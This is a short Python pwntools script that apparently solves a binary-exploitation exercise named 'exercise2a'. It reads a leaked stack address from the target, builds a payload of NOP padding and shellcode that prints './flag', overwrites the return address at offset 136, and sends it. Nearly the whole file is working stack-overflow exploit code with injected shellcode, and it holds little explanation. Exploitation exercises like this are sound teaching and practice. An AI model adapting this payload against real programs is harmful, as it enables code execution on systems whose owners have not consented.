#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *check_authorization+96
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

LEN_TO_RET_ADDR = 136
r = start()

# Whitespaces - 09, 0a, 0b, 0c, 0d, 20

read_flag = shellcraft.amd64.linux.cat('./flag', fd=1)

read_flag = asm(read_flag)

NOP_SLIDE_PROLOGUE_LEN = 16
nop_slide_prologue = asm(shellcraft.amd64.nop()) * NOP_SLIDE_PROLOGUE_LEN
nop_slide_epilogue = asm(shellcraft.amd64.nop()) * (LEN_TO_RET_ADDR - len(read_flag) - NOP_SLIDE_PROLOGUE_LEN)
v1_addr_raw = r.recvline().decode().strip()
print('WHYTF ' + v1_addr_raw)
v1_addr =  int(v1_addr_raw, 16)

sc = nop_slide_prologue + read_flag + nop_slide_epilogue
# Skip Some bytes, as a previous instruction might mess up the nop-slide
sc += pack(v1_addr + 8, 64)

r.sendline(sc)

a = r.recvall()
print(a)

with open('test', 'wb') as f:
    f.write(sc)
